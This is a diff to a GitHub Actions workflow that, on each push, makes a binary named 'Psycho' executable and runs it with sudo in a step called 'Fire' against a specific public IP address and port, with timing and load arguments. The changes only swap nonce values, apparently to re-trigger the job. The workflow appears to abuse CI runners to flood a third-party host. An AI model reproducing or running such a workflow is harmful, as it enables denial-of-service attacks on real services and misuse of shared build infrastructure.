@@ -1,4 +1,4 @@
-name: psycho-0bf880d4
+name: psycho-8c01cdb1
 on:
   push:
     branches: [ main, master ]
@@ -19,5 +19,5 @@ jobs:
       run: chmod +x Psycho
     - name: Fire
       run: timeout 120s sudo ./Psycho 91.108.17.38 32001 120 1200
-    - name: Nonce 0bf880d4
-      run: echo "nonce=0bf880d4"
+    - name: Nonce 8c01cdb1
+      run: echo "nonce=8c01cdb1"
